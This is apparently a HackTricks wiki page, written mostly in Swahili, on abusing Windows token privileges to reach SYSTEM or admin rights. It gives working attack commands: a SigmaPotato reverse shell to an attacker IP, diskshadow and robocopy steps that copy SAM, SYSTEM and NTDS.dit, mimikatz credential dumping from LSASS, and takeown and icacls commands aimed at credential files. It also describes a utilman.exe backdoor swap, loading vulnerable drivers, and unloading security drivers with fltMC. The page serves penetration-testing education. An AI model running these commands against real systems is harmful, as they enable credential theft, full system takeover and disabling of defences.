# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Kama hujui **Windows Access Tokens** ni nini, soma ukurasa huu kabla ya kuendelea:


{{#ref}}
access-tokens.md
{{#endref}}

**Huenda ukaweza kuongeza privileges kwa abusing tokens ulizonazo tayari**

### SeImpersonatePrivilege

Hii ni privilege ambayo hushikiliwa na mchakato wowote na huruhusu impersonation (lakini si creation) ya token yoyote, mradi tu handle kwake inaweza kupatikana. Privileged token inaweza kupatikana kutoka kwa Windows service (DCOM) kwa kuilazimisha ifanye NTLM authentication dhidi ya exploit, kisha kuruhusu execution ya process yenye SYSTEM privileges. Vulnerability hii inaweza kutumiwa kwa kutumia tools mbalimbali, kama [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (ambayo inahitaji winrm iwe disabled), [SweetPotato](https://github.com/CCob/SweetPotato), na [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: kwenye Windows 10 1809+/Server 2019+, tumia **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, au **PrintSpoofer** kulingana na ni RPC/COM surface gani bado inaweza kufikiwa.
- Ukiharibu service inayoenda kama **`LOCAL SERVICE`** au **`NETWORK SERVICE`** na `whoami /priv` inaonyesha **filtered token** bila **SeImpersonatePrivilege**/**SeAssignPrimaryTokenPrivilege**, kwanza rudisha **default privilege set** ya account hiyo (kwa mfano kwa **FullPowers**) kisha ujaribu tena family ya potato baadae.
- Forks fulani mpya ni rafiki zaidi kwa operator kuliko tools za awali. Kwa mfano, **SigmaPotato** huongeza reflection/in-memory execution na compatibility ya kisasa ya Windows, wakati **PrintNotifyPotato** hutumia vibaya PrintNotify COM service na mara nyingi ni useful wakati njia ya classic Spooler imezimwa.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Ni sawa sana na **SeImpersonatePrivilege**, itatumia **njia ileile** kupata privileged token.\
Kisha, privilege hii inaruhusu **kuassign primary token** kwa process mpya/iliyositishwa. Ukiwa na privileged impersonation token unaweza kupata primary token kwa kufanya derivation (DuplicateTokenEx).\
Kwa token hiyo, unaweza kuunda **new process** kwa kutumia 'CreateProcessAsUser' au kuunda process iliyositishwa na **kueka token** (kwa ujumla, huwezi kurekebisha primary token ya process inayoendelea).

### SeTcbPrivilege

Ukiwa umewezeshwa token hii unaweza kutumia **KERB_S4U_LOGON** kupata **impersonation token** kwa user mwingine yeyote bila kujua credentials, **kuongeza arbitrary group** (admins) kwenye token, kuweka **integrity level** ya token kuwa "**medium**", na kuassign token hii kwa **current thread** (SetThreadToken).

### SeBackupPrivilege

System husababisha **kutoa read access zote** kwa file yoyote (hupunguzwa kwa operations za kusoma tu) kupitia privilege hii. Hutumiwa kwa **kusoma password hashes za local Administrator** accounts kutoka registry, kisha tools kama "**psexec**" au "**wmiexec**" zinaweza kutumiwa na hash hiyo (Pass-the-Hash technique). Hata hivyo, technique hii hushindwa katika hali mbili: wakati Local Administrator account imezimwa, au wakati policy ipo inayoa administrative rights kutoka kwa Local Administrators wanaounganishwa remotely.\
Kwa vitendo, built-in workflow yenye uaminifu zaidi huwa mara nyingi **VSS + `robocopy /b`**: tengeneza/expose shadow copy, kisha nakili `SAM`/`SYSTEM` au `NTDS.dit` katika **backup mode**, ambayo hupitia file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Unaweza **abuse this privilege** kwa:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- kufuata **IppSec** katika [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Au kama ilivyoelezwa katika sehemu ya **escalating privileges with Backup Operators** ya:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ruhusa ya **write access** kwa faili yoyote ya mfumo, bila kujali Access Control List (ACL) ya faili hiyo, hutolewa na privilege hii. Inafungua uwezekano mwingi wa escalation, ikiwemo uwezo wa **modify services**, kufanya DLL Hijacking, na kuweka **debuggers** kupitia Image File Execution Options pamoja na mbinu nyingine mbalimbali.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ni ruhusa yenye nguvu, hasa muhimu wakati mtumiaji ana uwezo wa impersonate tokens, lakini pia hata bila SeImpersonatePrivilege. Uwezo huu unategemea uwezo wa impersonate token inayowakilisha mtumiaji yuleyule na ambayo integrity level yake haizidi ile ya current process.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Inawezekana kutumia SeCreateTokenPrivilege kwa EoP kwa impersonate tokens chini ya masharti fulani.
- **Conditions for Token Impersonation:** Impersonation yenye mafanikio inahitaji target token iwe ya mtumiaji yuleyule na iwe na integrity level iliyo chini ya au sawa na integrity level ya process inayojaribu impersonation.
- **Creation and Modification of Impersonation Tokens:** Watumiaji wanaweza kuunda impersonation token na kuiboresha kwa kuongeza SID (Security Identifier) ya group yenye privilege.

### SeLoadDriverPrivilege

Privilege hii inaruhusu **load and unload device drivers** kwa kuunda registry entry yenye values maalum za `ImagePath` na `Type`. Kwa kuwa direct write access kwa `HKLM` (HKEY_LOCAL_MACHINE) imezuiwa, `HKCU` (HKEY_CURRENT_USER) lazima itumike badala yake. Hata hivyo, ili kufanya `HKCU` itambulike na kernel kwa ajili ya driver configuration, path maalum lazima ifuatwe.

Matumizi ya kisasa ya offensive kwa kawaida ni **BYOVD** (bring your own vulnerable driver): load **signed but vulnerable** kernel driver na kisha tumia IOCTLs zake kuzima protections au kuruka kwenda kernel code execution. Kumbuka kwamba kwenye Windows 11/Server za hivi karibuni **Microsoft vulnerable driver blocklist** na/au **HVCI/Memory Integrity** mara nyingi huharibu chains za zamani za public, hivyo mifano ya kawaida ya aina ya `szkg64.sys` si tena reliable kwa wote.

Path hii ni `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, ambapo `<RID>` ni Relative Identifier ya current user. Ndani ya `HKCU`, path hii yote lazima iundwe, na values mbili zinahitaji kuwekwa:

- `ImagePath`, ambayo ni path ya binary itakayotekelezwa
- `Type`, ikiwa na value ya `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Fikia `HKCU` badala ya `HKLM` kutokana na restricted write access.
2. Unda path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` ndani ya `HKCU`, ambapo `<RID>` inawakilisha Relative Identifier ya current user.
3. Weka `ImagePath` kuwa path ya utekelezaji wa binary.
4. Toa `Type` kama `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Njia zaidi za kutumia vibaya hili privilege katika [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Hii ni sawa na **SeRestorePrivilege**. Kazi yake ya msingi inaruhusu process **kuchukua ownership ya object**, ikipita hitaji la explicit discretionary access kupitia utoaji wa WRITE_OWNER access rights. Mchakato unahusisha kwanza kuhakikisha ownership ya intended registry key kwa madhumuni ya kuandika, kisha kubadilisha DACL ili kuwezesha write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Hii privilege inaruhusu **kudebug nyingine processes**, ikiwemo kusoma na kuandika kwenye memory. Mikakati mbalimbali ya memory injection, inayoweza kuepuka antivirus nyingi na host intrusion prevention solutions, inaweza kutumika kwa privilege hii.

Kwenye Windows za kisasa, kumbuka kwamba `SeDebugPrivilege` kwa kawaida inatosha kufungua **non-protected SYSTEM processes** na ku-duplicate tokens zao, lakini si hakikisho kwamba unaweza kugusa **LSASS**. Ikiwa **RunAsPPL / LSA Protection** imewashwa, non-protected processes haziwezi kusoma au ku-inject ndani ya LSASS hata kama `SeDebugPrivilege` ipo. Katika hali hiyo, iba token kutoka kwa SYSTEM process nyingine isiyo ya PPL, au chain na PPL bypass/BYOVD badala ya kudhani `procdump` itafanya kazi. Kwa mfano kamili wa token-copy ukitumia `SeDebugPrivilege` + `SeImpersonatePrivilege`, angalia [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Unaweza kutumia [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) kutoka [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) ili **capture memory ya process**. Kwa usahihi, hii inaweza kutumika kwa process ya **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, ambayo inawajibika kuhifadhi user credentials mara tu user anapoingia kwa mafanikio kwenye system.

Kisha unaweza kupakia dump hii kwenye mimikatz ili kupata passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ikiwa unataka kupata `NT SYSTEM` shell unaweza kutumia:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Haki hii (Perform volume maintenance tasks) inaruhusu kufungua raw volume device handles (kwa mfano, \\.\C:) kwa direct disk I/O ambayo inapita NTFS ACLs. Kwa hiyo unaweza kunakili bytes za faili yoyote kwenye volume kwa kusoma underlying blocks, hivyo kuwezesha arbitrary file read ya data nyeti (kwa mfano, machine private keys katika %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS kupitia VSS). Inakuwa na athari kubwa hasa kwenye CA servers ambapo exfiltrating the CA private key huwezesha forging a Golden Certificate ili ku impersonate any principal.

Tazama techniques na mitigations za kina:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Tokens **zinazoonekana kama Disabled** kwa kawaida zinaweza kuwezeshwa, kwa hiyo mara nyingi unaweza kutumia vibaya privileges zote za _Enabled_ na _Disabled_.

### Enable All the tokens

Ikiwa una disabled privileges, unaweza kutumia script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) ili kuwezesha tokens zote:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Au [**script**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) iliyopachikwa kwenye [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------  | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Asante [Aurélien Chalot](https://twitter.com/Defte_) kwa sasisho. Nitajaribu kulifrasia upya liwe kama kichocheo hivi karibuni.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Soma faili nyeti kwa `robocopy /b` au zana maalum za kunakili zinazojua SeBackup.                                                                                                                                                                                                                                                                 | <p>- Nzuri kwa `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, na wakati mwingine `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ni rahisi, lakini cmdlets/APIs maalum za SeBackup mara nyingi huwa na unyumbufu zaidi kwa faili zilizofungwa/zilizofunguka.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Unda token yoyote ikijumuisha haki za local admin kwa `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Rudufu token ya SYSTEM ya **non-PPL** au dumpu memory kutoka kwenye process isiyolindwa.                                                                                                                                                                                                                                                                 | <p>Kutoa LSASS dump kwa kawaida huzuiwa ikiwa RunAsPPL/LSA Protection imewezeshwa.</p><p>Script inaweza kupatikana kwenye [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Tumia **Potato family** / impersonation ya named-pipe kuanzisha SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Kwa kawaida ni bora kutoka kwa service accounts kama IIS APPPOOL, MSSQL, scheduled tasks, au context yoyote ambayo tayari ina `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Pakia kernel driver iliyosainiwa lakini yenye udhaifu (BYOVD)<br>2. Tumia IOCTL za driver kupata kernel R/W, kuzima security tooling, au kupandisha hadi SYSTEM<br><br>Vinginevyo, privilege hii inaweza kutumika kuondoa load ya drivers zinazohusiana na usalama kwa amri iliyojengwa ndani `fltMC`, yaani `fltMC sysmondrv`</p>                     | <p>Drivers za zamani za umma kama `szkg64.sys` zinazidi kuzuiwa kwenye Windows za kisasa na vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Zindua PowerShell/ISE ikiwa privilege ya SeRestore ipo.<br>2. Wezesha privilege kwa <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Badilisha jina utilman.exe kuwa utilman.old<br>4. Badilisha jina cmd.exe kuwa utilman.exe<br>5. Funga console na bonyeza Win+U</p> | <p>Attack inaweza kugunduliwa na baadhi ya programu za AV.</p><p>Mbinu mbadala inategemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Badilisha jina cmd.exe kuwa utilman.exe<br>4. Funga console na bonyeza Win+U</p>                                                                                                                                       | <p>Attack inaweza kugunduliwa na baadhi ya programu za AV.</p><p>Mbinu mbadala inategemea kubadilisha service binaries zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens to have local admin rights included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
